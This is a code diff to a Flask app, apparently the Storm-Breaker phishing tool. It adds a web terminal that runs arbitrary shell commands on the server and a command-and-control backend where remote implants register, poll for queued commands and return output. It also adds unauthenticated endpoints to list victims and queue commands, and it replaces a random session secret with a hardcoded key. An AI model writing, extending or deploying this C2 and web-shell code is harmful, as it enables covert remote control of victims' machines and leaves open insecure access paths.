@@ -3,6 +3,8 @@ import os
 import json
 import re
 import base64
+import base64
+import subprocess
 from datetime import datetime
 
 BASE_DIR = os.path.dirname(__file__)
@@ -12,7 +14,7 @@ CHECK_C_PATH = os.path.join(BASE_DIR, 'check-c.json')
 PHP_CONFIG_PATH = os.path.join(BASE_DIR, 'config.php')
 
 app = Flask(__name__, static_folder=os.path.join(BASE_DIR, 'assets'), template_folder=FLASK_TEMPLATES_DIR)
-app.secret_key = os.urandom(24)
+app.secret_key = 'storm-breaker-secret-key-v1'
 # Disable upload size limit completely
 app.config['MAX_CONTENT_LENGTH'] = None
 
@@ -70,6 +72,11 @@ def load_php_config(path=PHP_CONFIG_PATH):
 
 CONFIG = load_php_config()
 
+# Global C2 State (In-memory for simplicity)
+C2_SESSIONS = {}
+C2_COMMANDS = {}
+C2_RESPONSES = {}
+
 
 @app.route('/')
 def index():
@@ -108,6 +115,9 @@ def panel():
     if cookie and cookie == key.get('token') and key.get('expired') == 'no':
         if not session.get('IAm-logined'):
             session['IAm-logined'] = 'yes'
+        # Initialize CWD for terminal
+        if 'cwd' not in session:
+            session['cwd'] = os.getcwd()
     elif session.get('IAm-logined'):
         client_token = generate_token()
         resp = make_response(render_template('panel.html', username=session.get('IAm-logined')))
@@ -689,6 +699,171 @@ def session_end():
         return jsonify({'status': 'success'})
     except Exception as e:
         return jsonify({'error': str(e)}), 500
+
+
+@app.route('/api/terminal', methods=['POST'])
+def terminal_exec():
+    """Handle terminal commands execution"""
+    try:
+        if not session.get('IAm-logined'):
+            return jsonify({'error': 'Unauthorized', 'output': 'Unauthorized access'}), 401
+
+        data = request.json
+        cmd = data.get('cmd', '').strip()
+        
+        # Get current working directory from session or default
+        cwd = session.get('cwd', os.getcwd())
+        
+        # Verify CWD exists, if not reset to default
+        if not os.path.exists(cwd):
+            cwd = os.getcwd()
+            session['cwd'] = cwd
+
+        if not cmd:
+            return jsonify({'output': '', 'cwd': cwd})
+
+        # Handle Directory Changes (cd)
+        if cmd.startswith('cd '):
+            new_dir_part = cmd[3:].strip()
+            # Handle "cd" (home) or "cd ~"
+            if not new_dir_part or new_dir_part == '~':
+                new_path = os.path.expanduser('~')
+            else:
+                new_path = os.path.join(cwd, new_dir_part)
+            
+            # Resolve relative paths (..)
+            new_path = os.path.abspath(new_path)
+            
+            if os.path.isdir(new_path):
+                session['cwd'] = new_path
+                return jsonify({'output': '', 'cwd': new_path})
+            else:
+                return jsonify({'output': f"cd: {new_dir_part}: No such file or directory", 'cwd': cwd})
+
+        # Process standard commands
+        try:
+            # Use specific shell based on OS
+            shell_cmd = cmd
+            if os.name == 'nt':
+                # Windows: we might want to capture stderr too
+                # Using shell=True for internal commands like dir, echo
+                completion = subprocess.run(shell_cmd, cwd=cwd, shell=True, capture_output=True, text=True)
+            else:
+                completion = subprocess.run(shell_cmd, cwd=cwd, shell=True, capture_output=True, text=True, executable='/bin/bash')
+            
+            output = completion.stdout
+            if completion.stderr:
+                output += "\n" + completion.stderr
+                
+            return jsonify({'output': output, 'cwd': cwd})
+            
+        except Exception as e:
+            return jsonify({'output': str(e), 'cwd': cwd})
+            
+    except Exception as e:
+        return jsonify({'error': str(e), 'output': f"Server Error: {str(e)}"}), 500
+
+
+# ===== C2 / REMOTE SHELL ENDPOINTS =====
+
+@app.route('/api/c2/register', methods=['POST'])
+def c2_register():
+    data = request.json
+    uid = data.get('uid')
+    info = data.get('info', {})
+    
+    C2_SESSIONS[uid] = {
+        'last_seen': datetime.now().isoformat(),
+        'info': info,
+        'ip': request.remote_addr
+    }
+    
+    # Initialize queues if new
+    if uid not in C2_COMMANDS:
+        C2_COMMANDS[uid] = []
+    if uid not in C2_RESPONSES:
+        C2_RESPONSES[uid] = []
+        
+    return jsonify({'status': 'registered'})
+
+@app.route('/api/c2/poll', methods=['POST'])
+def c2_poll():
+    data = request.json
+    uid = data.get('uid')
+    
+    if uid in C2_SESSIONS:
+        C2_SESSIONS[uid]['last_seen'] = datetime.now().isoformat()
+        
+    # Check for commands
+    if uid in C2_COMMANDS and len(C2_COMMANDS[uid]) > 0:
+        cmd = C2_COMMANDS[uid].pop(0)
+        return jsonify({'command': cmd})
+        
+    return jsonify({'command': None})
+
+@app.route('/api/c2/response', methods=['POST'])
+def c2_response():
+    data = request.json
+    uid = data.get('uid')
+    output = data.get('output')
+    
+    if uid in C2_SESSIONS:
+        C2_SESSIONS[uid]['last_seen'] = datetime.now().isoformat()
+    
+    if uid not in C2_RESPONSES:
+        C2_RESPONSES[uid] = []
+        
+    C2_RESPONSES[uid].append({
+        'timestamp': datetime.now().isoformat(),
+        'output': output
+    })
+    
+    return jsonify({'status': 'received'})
+
+# Admin APIs for Dashboard
+@app.route('/api/c2/clients')
+def c2_list_clients():
+    # Filter active clients (seen in last 60 seconds)
+    active = []
+    now = datetime.now()
+    for uid, sess in C2_SESSIONS.items():
+        # Calculate time diff
+        try:
+            last = datetime.fromisoformat(sess['last_seen'])
+            delta = (now - last).total_seconds()
+            status = 'online' if delta < 20 else 'offline'
+        except:
+            status = 'offline'
+            
+        active.append({
+            'uid': uid,
+            'ip': sess['ip'],
+            'info': sess['info'],
+            'status': status,
+            'last_seen': sess['last_seen']
+        })
+    return jsonify({'clients': active})
+
+@app.route('/api/c2/queue_command', methods=['POST'])
+def c2_queue_command():
+    data = request.json
+    uid = data.get('uid')
+    cmd = data.get('cmd')
+    
+    if uid not in C2_COMMANDS:
+        C2_COMMANDS[uid] = []
+        
+    C2_COMMANDS[uid].append(cmd)
+    return jsonify({'status': 'queued'})
+
+@app.route('/api/c2/get_responses/<uid>')
+def c2_get_responses(uid):
+    if uid in C2_RESPONSES:
+        resps = C2_RESPONSES[uid]
+        # Clear after reading to act like a stream
+        C2_RESPONSES[uid] = []
+        return jsonify({'responses': resps})
+    return jsonify({'responses': []})
 
 
 if __name__ == '__main__':
